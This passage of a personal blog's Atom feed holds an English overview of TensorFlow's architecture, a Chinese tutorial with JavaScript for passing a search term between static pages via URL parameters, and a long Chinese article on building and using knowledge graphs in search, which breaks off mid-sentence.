      <category term="Bioinformatics" scheme="http://home.meng.uno/tags/Bioinformatics/"/>
    
      <category term="TC-score" scheme="http://home.meng.uno/tags/TC-score/"/>
    
      <category term="SP-score" scheme="http://home.meng.uno/tags/SP-score/"/>
    
  </entry>
  
  <entry>
    <title>Implementation details of TensorFlow</title>
    <link href="http://home.meng.uno/articles/717ad116/"/>
    <id>http://home.meng.uno/articles/717ad116/</id>
    <published>2018-10-02T02:45:47.000Z</published>
    <updated>2020-12-02T02:08:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1>Brief introduction to TensorFlow</h1><ul>  <li>Open source</li>  <li>A second-generation machine learning system</li>  <li>Developed by Google</li>  <li>Improving flexibility and portability, speed and scalability</li>  <li>A framework for implementing and executing machine learning algorithms</li>  <li>In the form of a tensor flowing over a Graph</li></ul><blockquote>  <p>Stars of open source Deep Learning platforms in GitHub</p></blockquote><p><img src="http://www.meng.uno/images/tensorflow/stars.png" alt="Stars on GitHub"></p><h1>The architecture of TensorFlow</h1><p><img src="http://www.meng.uno/images/tensorflow/arch.png" alt="architecture"></p><ul>  <li>    <p><strong>Front-end:</strong> Provide programming model, responsible for the construction of computational graphs, Python, C++ and other language support.</p>  </li>  <li>    <p><strong>Back-end:</strong> Provide the runtime environment, responsible for executing the calculation diagram, and using C++.</p>  </li></ul><h1>Code directory organization structure</h1><p><img src="http://www.meng.uno/images/tensorflow/code.png" alt="Code"></p><ul>  <li><strong>graph:</strong> Calculate flow graph related operations, such as construct, partition, optimize, execute, etc.</li>  <li><strong>kernels:</strong> Opkernels, such as matmul, conv2d, argmax, batch_norm, etc.</li>  <li><strong>ops:</strong> basic operations, gradient operation, IO related ops, control flow and data flow operation.</li>  <li><strong>eigen3:</strong> eigen matrix operation library, TensorFlow foundation operations’ call.</li></ul><h1>TensorFlow programming mode</h1><ul>  <li>TensorFlow uses <strong>symbolic programming</strong>.</li>  <li>Symbolic programming abstracts the calculation process into a graph, and all input nodes, operation nodes and output nodes are symbolized.</li>  <li>Symbolic programming is more efficient in memory and computation.</li>  <li>Symbolic programming programs either explicitly or implicitly contain compilation steps, wrapping previously defined computational diagrams into callable functions, whereas the actual calculation occurs after compilation.</li></ul><h1>Basic concepts of TensorFlow</h1><ul>  <li>Use Graph to represent the calculation process.</li>  <li>Execution diagram in Session.</li>  <li>Using Tensor to represent data.</li>  <li>Using Variable to maintain state.</li>  <li>Use Feed and Fetch to assign or extract data from any operation.</li></ul><blockquote>  <p>Graph is a description of the computation process and needs to be run in Session.</p>  <p>TensorFlow provides a Feed mechanism to import data from outside, in addition to using Variable and Constant to import data.</p>  <p>Tensor, that is, any dimension of data, one-dimensional, two-dimensional, three-dimensional, four-dimensional data collectively known as tensor. TensorFlow refers to keeping data nodes unchanged and allowing data to flow.</p></blockquote><p><strong>An Example:</strong></p><p><img src="http://www.meng.uno/images/tensorflow/ex.png" alt="Example"></p><h1>TensorFlow implementation process</h1><h2 id="the-construction-of-a-graph">The construction of a graph</h2><p>Creating a graph to represent and train the neural network in this phase.</p><p><img src="http://www.meng.uno/images/tensorflow/graph.png" alt="Graph"></p><h2 id="the-execution-of-the-graph">The execution of the graph</h2><p>The training operations in the diagram is executed repeatedly at this stage.</p><h1>Brief summary of TensorFlow</h1><p>TensorFlow is a programming system that represents computation as a graph. The nodes in the graph are called ops (operation). A ops uses 0 or more Tensors to generate 0 or more Tensors by performing some operations. A Tensor is a multidimensional array.  For example, you can represent a batch of images as a four-dimensional array [batch, height, width, channels], with floating-point values.</p><p>TensorFlow uses the tensor data structure (which is actually a multidimensional data) to represent all the data and pass it between the nodes in the graph calculation. A tensor has a fixed type, level, and size, and you can refer to Rank, Shape, and Type  for a deeper understanding of these concepts.</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/717ad116/">http://home.meng.uno/articles/717ad116/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Brief introduction to TensorFlow
 * Open source
 * A second-generation machine learning system
 * Developed by Google
 * Improving flexibility and portability, speed and scalability
 * A framework for implementing and executing machine learning algorithms
 * In the form of a tensor flowing over a Gr
    
    </summary>
    
      <category term="Deep Learning" scheme="http://home.meng.uno/categories/Deep-Learning/"/>
    
    
      <category term="Deep Learning" scheme="http://home.meng.uno/tags/Deep-Learning/"/>
    
      <category term="TensorFlow" scheme="http://home.meng.uno/tags/TensorFlow/"/>
    
  </entry>
  
  <entry>
    <title>静态前端页面向静态前端页面跳转并执行AJAX操作将数据写入跳入界面</title>
    <link href="http://home.meng.uno/articles/2b207973/"/>
    <id>http://home.meng.uno/articles/2b207973/</id>
    <published>2018-08-15T14:09:21.000Z</published>
    <updated>2020-12-02T01:46:46.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>在暑假进行的项目 <a href="https://github.com/kuangmeng/MedicalTextInfo" target="_blank" rel="noopener">医疗文本处理平台</a> 中，我需要将队友的Ajax写好的功能整合到我的界面上，因为他之前是一个界面，而我想做成像搜索引擎那种，在一个页面上输入搜索词，跳转到另一个页面显示结果（后跳转界面还可以继续通过Ajax获得新的搜索结果）</p></blockquote><p>在这里将前一个页面命名为A，后一个为B（什么文件格式不重要，只要是静态页面就成）。</p><h1>A中的JavaScript代码</h1><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function jumpOnClick(flag) &#123;</span><br><span class="line">url = &quot;section3_2.jsp?text=&quot; + encodeURIComponent(document.getElementById(&apos;search&apos;).value) + &quot;&amp;flag=&quot; + flag;</span><br><span class="line">if(document.getElementById(&apos;search&apos;).value.match(&quot;\\s+&quot;) || document.getElementById(&apos;search&apos;).value == null || document.getElementById(&apos;search&apos;).value == &quot;&quot;)&#123;</span><br><span class="line">alert(&quot;请输入症状或问题后点击相应查询按钮！&quot;);</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">//网页跳转</span><br><span class="line">location.href = url;</span><br><span class="line"></span><br><span class="line">window.event.returnValue=false;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>在A中，我将调用放到了按钮的onclick中。</p><h1>B中的JavaScript代码</h1><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">　　function GetUrlParam() &#123;</span><br><span class="line">　　　　var url = document.location.toString();</span><br><span class="line">　　　　var arrObj = url.split(&quot;?&quot;);</span><br><span class="line">var text,flag;</span><br><span class="line">　　　　if (arrObj.length &gt; 1) &#123;</span><br><span class="line">　　　　　　var arrPara = arrObj[1].split(&quot;&amp;&quot;);</span><br><span class="line">　　　　　　var arr;</span><br><span class="line">　　　　　　for (var i = 0; i &lt; arrPara.length; i++) &#123;</span><br><span class="line">　　　　　　　　arr = arrPara[i].split(&quot;=&quot;);</span><br><span class="line">　　　　　　　　if (arr != null &amp;&amp; arr[0] == &quot;text&quot;) &#123;</span><br><span class="line">　　　　　　　　　　text = decodeURIComponent(arr[1]);</span><br><span class="line">   flag = 0;</span><br><span class="line">   if(text == &quot;&quot; || text == null)&#123;</span><br><span class="line">   return;</span><br><span class="line">   &#125;</span><br><span class="line">    var psel = document.getElementById(&quot;kw&quot;);</span><br><span class="line">                    psel.value = text; //设置</span><br><span class="line">　　　　　　　　&#125;else if(arr != null &amp;&amp; arr[0] == &quot;flag&quot;)&#123;</span><br><span class="line">  flag = arr[1];</span><br><span class="line">  &#125;</span><br><span class="line">　　　　　　&#125;</span><br><span class="line">if(flag == 1)&#123;</span><br><span class="line">searchOnClick(text);</span><br><span class="line">&#125;else if(flag == 2)&#123;</span><br><span class="line">search2OnClick(text);</span><br><span class="line">&#125;</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>在B中，我将调用放到了body的onload中。</p><blockquote>  <p>至此完成上述功能，并且保证了在后跳入页面上刷新时，不会因为保留了跳入内容而无法刷新的情况。</p></blockquote><p><br><br>本文链接： <a href="http://home.meng.uno/articles/2b207973/">http://home.meng.uno/articles/2b207973/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      在暑假进行的项目 医疗文本处理平台 中，我需要将队友的Ajax写好的功能整合到我的界面上，因为他之前是一个界面，而我想做成像搜索引擎那种，在一个页面上输入搜索词，跳转到另一个页面显示结果（后跳转界面还可以继续通过Ajax获得新的搜索结果）

在这里将前一个页面命名为A，后一个为B（什么文件格式不重要，只要是静态页面就成）。

A中的JavaScript代码
1
2
3
4
5
6
7
8
9
10
11
12
13


&lt;script type=&quot;text/javascript&quot;&gt;
			function jumpOnClick(flag) {
					url = &quot;section3_2.j
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="Java" scheme="http://home.meng.uno/tags/Java/"/>
    
      <category term="前端" scheme="http://home.meng.uno/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="Web" scheme="http://home.meng.uno/tags/Web/"/>
    
      <category term="Ajax" scheme="http://home.meng.uno/tags/Ajax/"/>
    
  </entry>
  
  <entry>
    <title>知识图谱（Knowledge Graph）</title>
    <link href="http://home.meng.uno/articles/349dc05d/"/>
    <id>http://home.meng.uno/articles/349dc05d/</id>
    <published>2018-08-07T07:05:54.000Z</published>
    <updated>2020-12-02T01:51:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1>简介</h1><p>近两年来，随着Linking Open Data等项目的全面展开，语义Web数据源的数量激增，大量RDF数据被发布。互联网正从仅包含网页和网页之间超链接的文档万维网(Document Web)转变成包含大量描述各种实体和实体之间丰富关系的数据万维网(Data Web)。在这个背景下，Google、百度和搜狗等搜索引擎公司纷纷以此为基础构建知识图谱，分别为Knowledge Graph、知心和知立方，来改进搜索质量，从而拉开了语义搜索的序幕。下面我将从以下几个方面来介绍知识图谱：知识图谱的表示和在搜索中的展现形式，知识图谱的构建和知识图谱在搜索中的应用等，从而让大家有机会了解其内部的技术实现和各种挑战。</p><h2 id="知识图谱的表示和在搜索中的展现形式">知识图谱的表示和在搜索中的展现形式</h2><p>正如Google的辛格博士在介绍知识图谱时提到的：“The world is not made of strings , but is made of things.”，知识图谱旨在描述真实世界中存在的各种实体或概念。其中，每个实体或概念用一个全局唯一确定的ID来标识，称为它们的标识符(identifier)。每个属性-值对(attribute-value pair，又称AVP)用来刻画实体的内在特性，而关系(relation)用来连接两个实体，刻画它们之间的关联。知识图谱亦可被看作是一张巨大的图，图中的节点表示实体或概念，而图中的边则由属性或关系构成。上述图模型可用W3C提出的资源描述框架RDF[2]  或属性图(property graph)[3] 来表示。知识图谱率先由Google提出，以提高其搜索的质量。</p><p>为了更好地理解知识图谱，我们先来看一下其在搜索中的展现形式，即知识卡片(又称Knowledge Card)。知识卡片旨在为用户提供更多与搜索内容相关的信息。更具体地说，知识卡片为用户查询中所包含的实体或返回的答案提供详细的结构化摘要。从某种意义来说，它是特定于查询(query specific)的知识图谱。例如，当在搜索引擎中输入“姚明”作为关键词时，我们发现搜索结果页面的右侧原先用于置放广告的地方被知识卡片所取代。广告被移至左上角，而广告下面则显示的是传统的搜索结果，即匹配关键词的文档列表。这个布局上的微调也预示着各大搜索引擎在提高用户体验和直接返回答案方面的决心。</p><h2 id="相关名词解释">相关名词解释</h2><ol>  <li>    <p>Knowledge Base：通常翻译为“知识库”。知识库是人工智能的经典概念之一。最早是作为专家系统（Expert System）的组成部分，用于支持推理。知识库中的知识有很多种不同的形式，例如本体知识、关联性知识、规则库、案例知识等。相比于知识库的概念，知识图谱更加侧重关联性知识的构建，如三元组。</p>  </li>  <li>    <p>The Semantic Web ：通常翻译为“语义网”或“语义互联网”，是Web之父Tim Berners Lee于1998年提出的【1】。语义互联网的核心内涵是：Web不仅仅要通过超链接把文本页面链接起来，还应该把事物链接起来，使得搜索引擎可以直接对事物进行搜索，而不仅仅是对网页进行搜索。谷歌知识图谱是语义互联网这一理念的商业化实现。也可以把语义互联网看做是一个基于互联网共同构建的全球知识库。</p>  </li>  <li>    <p>Linked Data：通常翻译为“链接数据”。是Tim Berners Lee于2006年提出，是为了强调语义互联网的目的是要建立数据之间的链接，而非仅仅是把结构化的数据发布到网上。他为建立数据之间的链接制定了四个原则。从理念上讲，链接数据最接近于知识图谱的概念。但很多商业知识图谱的具体实现并不一定完全遵循Tim所提出的那四个原则。</p>  </li>  <li>    <p>Semantic Net/ Semantic Network：通常翻译为“语义网络”或“语义网”，这个翻译通常被与Semantic Web的翻译混淆起来，为了以示区别，这里采用“语义网络”的翻译。语义网络最早是1960年由认知科学家Allan M. Collins作为知识表示的一种方法提出。WordNet是最典型的语义网络。相比起知识图谱，早期的语义网络更加侧重描述概念以及概念之间的关系，而知识图谱更加强调数据或事物之间的链接。</p>  </li>  <li>    <p>Ontology：通常翻译为“本体”。本体本身是个哲学名词。在上个世纪80年代，人工智能研究人员将这一概念引入了计算机领域。Tom Gruber把本体定义为“概念和关系的形式化描述”。通俗点讲，本体相似于数据库中的Schema，主要用来定义类和关系，以及类层次和关系层次等。OWL是最常用的本体描述语言。本体通常被用来为知识图谱定义Schema。</p>  </li></ol><p>通过上述的介绍，大家应该对知识图谱的表示以及其在搜索中的展现形式有了更深的了解。接着，我将介绍知识图谱的构建以及如何在搜索中应用知识图谱返回相应的知识卡片以及答案。</p><h1>知识图谱的构建</h1><h2 id="知识图谱的规模">知识图谱的规模</h2><p>据不完全统计，Google知识图谱到目前为止包含了5亿个实体和35亿条事实(形如实体-属性-值，和实体-关系-实体)。其知识图谱是面向全球的，因此包含了实体和相关事实的多语言描述。不过相比占主导的英语外，仅包含其他语言(如中文)的知识图谱的规模则小了很多。与此不同的是，百度和搜狗主要针对中文搜索推出知识图谱，其知识库中的知识也主要以中文来描述，其规模略小于Google的。</p><h2 id="知识图谱的数据来源">知识图谱的数据来源</h2><p>为了提高搜索质量，特别是提供如对话搜索和复杂问答等新的搜索体验，我们不仅要求知识图谱包含大量高质量的常识性知识，还要能及时发现并添加新的知识。在这种背景下，知识图谱通过收集来自百科类站点和各种垂直站点的结构化数据来覆盖大部分常识性知识。这些数据普遍质量较高，更新比较慢。而另一方面，知识图谱通过从各种半结构化数据(形如HTML表格)抽取相关实体的属性-值对来丰富实体的描述。此外，通过搜索日志(query log)发现新的实体或新的实体属性从而不断扩展知识图谱的覆盖率。相比高质量的常识性知识，通过数据挖掘抽取得到的知识数据更大，更能反映当前用户的查询需求并能及时发现最新的实体或事实，但其质量相对较差，存在一定的错误。这些知识利用互联网的冗余性在后续的挖掘中通过投票或其他聚合算法来评估其置信度，并通过人工审核加入到知识图谱中。</p><h3 id="百科类数据">百科类数据</h3><p>维基百科，通过协同编辑，已经成为最大的在线百科全书，其质量与大英百科媲美。可以通过以下方式来从维基百科中获取所需的内容：通过文章页面(Article Page)抽取各种实体;通过重定向页面(Redirect Page)获得这些实体的同义词(又称Synonym);通过去歧义页面(Disambiguation Page)和内链锚文本(Internal Link Anchor Text)获得它们的同音异义词(又称Homonym);通过概念页面(Category Page)获得各种概念以及其上下位(subclass)关系;通过文章页面关联的开放分类抽取实体所对应的类别;通过信息框(Infobox)抽取实体所对应的属性-值对和关系-实体对。类似地，从百度百科和互动百科抽取各种中文知识来弥补维基百科中文数据不足的缺陷。此外，Freebase[5]  是另一个重要的百科类的数据源，其包含超过3900万个实体(其称为Topics)和18亿条事实，规模远大于维基百科。对比之前提及的知识图谱的规模，我们发现仅Freebase一个数据源就构成了Google知识图谱的半壁江山。更为重要的是，维基百科所编辑的是各种词条，这些词条以文章的形式来展现，包含各种半结构化信息，需要通过事先制定的规则来抽取知识;而Freebase则直接编辑知识，包括实体及其包含的属性和关系，以及实体所属的类型等结构化信息。因此，不需要通过任何抽取规则即可获得高质量的知识。虽然开发Freebase的母公司MetaWeb于2010年被Google收购，Freebase还是作为开放的知识管理平台独立运行。所以百度和搜狗也将Freebase加入到其知识图谱中。</p><h3 id="结构化数据">结构化数据</h3><p>除了百科类的数据，各大搜索引擎公司在构建知识图谱时，还考虑其他结构化数据。其中，LOD项目在发布各种语义数据的同时，通过owl:sameAs将新发布的语义数据中涉及的实体和LOD中已有数据源所包含的潜在同一实体进行关联，从而实现了手工的实体对齐(entity alignment)。LOD不仅包括如DBpedia和YAGO等通用语义数据集，还包括如MusicBrainz和DrugBank等特定领域的知识库。因此，Google等通过整合LOD中的(部分)语义数据提高知识的覆盖率，尤其是垂直领域的各种知识。此外，Web上存在大量高质量的垂直领域站点(如电商网站，点评网站等)，这些站点被称为Deep  Web。它们通过动态网页技术将保存在数据库中的各种领域相关的结构化数据以HTML表格的形式展现给用户。各大搜索引擎公司通过收购这些站点或购买其数据来进一步扩充其知识图谱在特定领域的知识。 这样做出于三方面原因：</p><ol>  <li>大量爬取这些站点的数据会占据大量带宽，导致这些站点无法被正常访问;</li>  <li>爬取全站点数据可能会涉及知识产权纠纷;</li>  <li>相比静态网页的爬取，Deep Web爬虫需要通过表单填充(Form Filling)技术来获取相关内容，且解析这些页面中包含的结构化信息需要额外的自动化抽取算法，具体细节在下一节描述。</li></ol><h3 id="半结构化数据挖掘avp">半结构化数据挖掘AVP</h3><p>虽然从Deep Web爬取数据并解析其中所包含的结构化信息面临很大的挑战，各大搜索引擎公司仍在这方面投入了大量精力。一方面，Web上存在大量长尾的结构化站点，这些站点提供的数据与最主流的相关领域站点所提供的内容具有很强的互补性，因此对这些长尾站点进行大规模的信息抽取(尤其是实体相关的属性-值对的抽取)对于知识图谱所含内容的扩展是非常有价值的。另一方面，中文百科类的站点(如百度百科等)的结构化程度远不如维基百科，能通过信息框获得AVP的实体非常稀少，大量属性-值对隐含在一些列表或表格中。一个切实可行的做法是构建面向站点的包装器(Site-specific  Wrapper)。其背后的基本思想是：**一个Deep Web站点中的各种页面由统一的程序动态生成，具有类似的布局和结构。**利用这一点，我们仅需从当前待抽取站点采样并标注几个典型详细页面(Detailed Pages)，利用这些页面通过模式学习算法(Pattern Learning)自动构建出一个或多个以类Xpath表示的模式，然后将其应用在该站点的其他详细页面中从而实现自动化的AVP抽取。对于百科类站点，我们可以将具有相同类别的页面作为某个“虚拟”站点，并使用类似的方法进行实体AVP的抽取。自动学习获得的模式并非完美，可能会遗漏部分重要的属性，也可能产生错误的抽取结果。为了应对这个问题，搜索引擎公司往往通过构建工具来可视化这些模式，并人工调整或新增合适的模式用于抽取。此外，通过人工评估抽取的结果，将那些抽取结果不令人满意的典型页面进行再标注来更新训练样本，从而达到主动学习(Active  Learning)的目的。</p><h3 id="通过搜索日志进行实体和实体属性等挖掘">通过搜索日志进行实体和实体属性等挖掘</h3><p>搜索日志是搜索引擎公司积累的宝贵财富。一条搜索日志形如**&lt;查询，点击的页面链接，时间戳&gt;**。通过挖掘搜索日志，我们往往可以发现最新出现的各种实体及其属性，从而保证知识图谱的实时性。这里侧重于从查询的关键词短语和点击的页面所对应的标题中抽取实体及其属性。选择查询作为抽取目标的意义在于其反映了用户最新最广泛的需求，从中能挖掘出用户感兴趣的实体以及实体对应的属性。而选择页面的标题作为抽取目标的意义在于标题往往是对整个页面的摘要，包含最重要的信息。据百度研究者的统计，90%以上的实体可以在网页标题中被找到。为了完成上述抽取任务，一个常用的做法是：针对每个类别，挑选出若干属于该类的实体(及相关属性)作为种子(Seeds)，找到包含这些种子的查询和页面标题，形成正则表达式或文法模式。这些模式将被用于抽取查询和页面标题中出现的其他实体及其属性。如果当前抽取所得的实体未被包含在知识图谱中，则该实体成为一个新的候选实体。类似地，如果当前被抽取的属性未出现在知识图谱中，则此属性成为一个新的候选属性。这里，我们仅保留置信度高的实体及其属性，新增的实体和属性将被作为新的种子发现新的模式。此过程不断迭代直到没有新的种子可以加入或所有的模式都已经找到且无法泛化。在决定模式的好坏时，常用的基本原则是尽量多地发现属于当前类别的实体和对应属性，尽量少地抽取出属于其他类别的实体及属性。上述方法被称为基于Bootstrapping的多类别协同模式学习。</p><h2 id="从抽取图谱到知识图谱">从抽取图谱到知识图谱</h2><p>上述所介绍的方法仅仅是从各种类型的数据源抽取构建知识图谱所需的各种候选实体(概念)及其属性关联，形成了一个个孤立的抽取图谱(Extraction Graphs)。为了形成一个真正的知识图谱，我们需要将这些信息孤岛集成在一起。下面我对知识图谱挖掘所涉及的重要技术点逐一进行介绍。</p><h3 id="实体对齐">实体对齐</h3><p>实体对齐(Object Alignment)旨在发现具有不同ID但却代表真实世界中同一对象的那些实体，并将这些实体归并为一个具有全局唯一标识的实体对象添加到知识图谱中。虽然实体对齐在数据库领域被广泛研究，但面对如此多异构数据源上的Web规模的实体对齐，这还是第一次尝试。各大搜索引擎公司普遍采用的方法是聚类。聚类的关键在于定义合适的相似度度量。这些相似度度量遵循如下观察：具有相同描述的实体可能代表同一实体(字符相似);具有相同属性-值的实体可能代表相同对象(属性相似);具有相同邻居的实体可能指向同一个对象(结构相似)。在此基础上，为了解决大规模实体对齐存在的效率问题，各种基于数据划分或分割的算法被提出将实体分成一个个子集，在这些子集上使用基于更复杂的相似度计算的聚类并行地发现潜在相同的对象。另外，利用来自如LOD中已有的对齐标注数据(使用owl:sameAs关联两个实体)作为训练数据，然后结合相似度计算使用如标签传递(Label  Propagation)等基于图的半监督学习算法发现更多相同的实体对。无论何种自动化方法都无法保证100%的准确率，所以这些方法的产出结果将作为候选供人工进一步审核和过滤。</p><h3 id="知识图谱schema构建">知识图谱schema构建</h3><p>在之前的技术点介绍中，大部分篇幅均在介绍知识图谱中数据层(Data Level)的构建，而没有过多涉及模式层(Schema Level)。事实上，模式是对知识的提炼，而且遵循预先给定的schema有助于知识的标准化，更利于查询等后续处理。为知识图谱构建schema相当于为其建立本体(Ontology)。最基本的本体包括概念、概念层次、属性、属性值类型、关系、关系定义域(Domain)概念集以及关系值域(Range)概念集。在此基础上，我们可以额外添加规则(Rules)或公理(Axioms)来表示模式层更复杂的约束关系。面对如此庞大且领域无关的知识库，即使是构建最基本的本体，也是非常有挑战的。Google等公司普遍采用的方法是自顶向下(Top-Down)和自底向上(Bottom-Up)相结合的方式。这里，自顶向下的方式是指通过本体编辑器(Ontology  Editor)预先构建本体。当然这里的本体构建不是从无到有的过程，而是依赖于从百科类和结构化数据得到的高质量知识中所提取的模式信息。更值得一提的是，Google知识图谱的Schema是在其收购的Freebase的schema基础上修改而得。Freebase的模式定义了Domain(领域)，Type(类别)和Topic(主题，即实体)。每个Domain有若干Types，每个Type包含多个Topics且和多个Properties关联，这些Properties规定了属于当前Type的那些Topics需要包含的属性和关系。定义好的模式可被用于抽取属于某个Type或满足某个Property的新实体(或实体对)。另一方面，自底向上的方式则通过上面介绍的各种抽取技术，特别是通过搜索日志和Web  Table抽取发现的类别、属性和关系，并将这些置信度高的模式合并到知识图谱中。合并过程将使用类似实体对齐的对齐算法。对于未能匹配原有知识图谱中模式的类别、属性和关系作为新的模式加入知识图谱供人工过滤。自顶向下的方法有利于抽取新的实例，保证抽取质量，而自底向上的方法则能发现新的模式。两者是互补的。</p><h3 id="不一致性的解决">不一致性的解决</h3><p>当融合来自不同数据源的信息构成知识图谱时，有一些实体会同时属于两个互斥的类别(如男女)或某个实体所对应的一个Property11对应多个值。这样就会出现不一致性。这些互斥的类别对以及Functional Properties可以看作是模式层的知识，通常规模不是很大，可以通过手工指定规则来定义。而由于不一致性的检测要面对大规模的实体及相关事实，纯手工的方法将不再可行。一个简单有效的方法充分考虑数据源的可靠性以及不同信息在各个数据源中出现的频度等因素来决定最终选用哪个类别或哪个属性值。也就是说，我们优先采用那些可靠性高的数据源(如百科类或结构化数据)抽取得到的事实。另外，如果一个实体在多个数据源中都被识别为某个类别的实例，或实体某个functional  property在多个数据源中都对应相同的值，那么我们倾向于最终选择该类别和该值。注：在统计某个类别在数据源中出现的频率前需要完成类别对齐计算。类似地，对于数值型的属性值我们还需要额外统一它们所使用的单位。</p><h2 id="知识图谱上的挖掘">知识图谱上的挖掘</h2><p>通过各种信息抽取和数据集成技术已经可以构建Web规模的知识图谱。为了进一步增加图谱的知识覆盖率，需要进一步在知识图谱上进行挖掘。下面将介绍几项重要的基于知识图谱的挖掘技术。</p><h3 id="推理">推理</h3><p>推理(Reasoning或Inference)被广泛用于发现隐含知识。推理功能一般通过可扩展的规则引擎来完成。知识图谱上的规则一般涉及两大类。一类是针对属性的，即通过数值计算来获取其属性值。例如：知识图谱中包含某人的出生年月，我们可以通过当前日期减去其出生年月获取其年龄。这类规则对于那些属性值随时间或其他因素发生改变的情况特别有用。另一类是针对关系的，即通过(链式)规则发现实体间的隐含关系。例如，我们可以定义规定：岳父是妻子的父亲。利用这条规则，当已知姚明的妻子(叶莉)和叶莉的父亲(叶发)时，可以推出姚明的岳父是叶发。</p><h3 id="实体重要性排序">实体重要性排序</h3><p>搜索引擎识别用户查询中提到的实体，并通过知识卡片展现该实体的结构化摘要。当查询涉及多个实体时，搜索引擎将选择与查询更相关且更重要的实体来展示。实体的相关性度量需在查询时在线计算，而实体重要性与查询无关可离线计算。搜索引擎公司将PageRank算法[12] 应用在知识图谱上来计算实体的重要性。和传统的Web Graph相比，知识图谱中的节点从单一的网页变成了各种类型的实体，而图中的边也由连接网页的超链接(Hyperlink)变成丰富的各种语义关系。由于不同的实体和语义关系的流行程度以及抽取的置信度均不同，而这些因素将影响实体重要性的最终计算结果，因此，各大搜索引擎公司嵌入这些因素来刻画实体和语义关系的初始重要性，从而使用带偏的PageRank算法(Biased  PageRank)。</p><h3 id="相关实体挖掘">相关实体挖掘</h3><p>在相同查询中共现的实体，或在同一个查询会话(Session)中被提到的其他实体称为相关实体。一个常用的做法是将这些查询或会话看作是虚拟文档，将其中出现的实体看作是文档中的词条，使用主题模型(如LDA)发现虚拟文档集中的主题分布。其中每个主题包含1个或多个实体，这些在同一个主题中的实体互为相关实体。当用户输入查询时，搜索引擎分析查询的主题分布并选出最相关的主题。同时，搜索引擎将给出该主题中与知识卡片所展现的实体最相关的那些实体作为“其他人还搜了”的推荐结果。</p><h2 id="知识图谱的更新和维护">知识图谱的更新和维护</h2><h3 id="type和collection的关系">Type和Collection的关系</h3><p>知识图谱的schema为了保证其质量，由专业团队审核和维护。以Google知识图谱为例，目前定义的Type数在103-104的数量级。为了提高知识图谱的覆盖率，搜索引擎公司还通过自动化算法从各种数据源抽取新的类型信息(也包含关联的Property信息)，这些类型信息通过一个称为Collection的数据结构保存。它们不是马上被加入到知识图谱schema中。有些今天生成后第二天就被删除了，有些则能长期的保留在Collection中，如果Collection中的某一种类型能够长期的保留，发展到一定程度后，由专业的人员进行决策和命名并最终成为一种新的Type。</p><h3 id="结构化站点包装器的维护">结构化站点包装器的维护</h3><p>站点的更新常常会导致原有模式失效。搜索引擎会定期检查站点是否存在更新。当检测到现有页面(原先已爬取)发生了变化，搜索引擎会检查这些页面的变化量，同时使用最新的站点包装器进行AVP抽取。如果变化量超过事先设定的阈值且抽取结果与原先标注的答案差别较大，则表明现有的站点包装器失效了。在这种情况下，需要对最新的页面进行重新标注并学习新的模式，从而构建更新的包装器。</p><h3 id="知识图谱的更新频率">知识图谱的更新频率</h3><p>加入到知识图谱中的数据不是一成不变的。Type对应的实例往往是动态变化的。例如，美国总统，随着时间的推移，可能对应不同的人。由于数据层的规模和更新频度都远超schema层，搜索引擎公司利用其强大的计算保证图谱每天的更新都能在3个小时内完成，而实时的热点也能保证在事件发生6个小时内在搜索结果中反映出来。</p><h3 id="众包-crowdsourcing-反馈机制">众包(Crowdsourcing)反馈机制</h3><p>除了搜索引擎公司内部的专业团队对构建的知识图谱进行审核和维护，它们还依赖用户来帮助改善图谱。具体来说，用户可以对搜索结果中展现的知识卡片所列出的实体相关的事实进行纠错。当很多用户都指出某个错误时，搜索引擎将采纳并修正。这种利用群体智慧的协同式知识编辑是对专业团队集中式管理的互补。</p><h1>知识图谱在搜索中的应用</h1><h2 id="查询理解">查询理解</h2><p>搜索引擎借助知识图谱来识别查询中涉及到的实体(概念)及其属性等，并根据实体的重要性展现相应的知识卡片。搜索引擎并非展现实体的全部属性，而是根据当前输入的查询自动选择最相关的属性及属性值来显示。此外，搜索引擎仅当知识卡片所涉及的知识的正确性很高(通常超过95%，甚至达到99%)时，才会展现。当要展现的实体被选中之后，利用相关实体挖掘来推荐其他用户可能感兴趣的实体供进一步浏览。</p><h2 id="问题回答">问题回答</h2><p>除了展现与查询相关的知识卡片，知识图谱对于搜索所带来的另一个革新是：直接返回答案，而不仅仅是排序的文档列表。要实现自动问答系统，搜索引擎不仅要理解查询中涉及到的实体及其属性，更需要理解查询所对应的语义信息。搜索引擎通过高效的图搜索，在知识图谱中查找连接这些实体及属性的子图并转换为相应的图查询(如SPARQL[13] 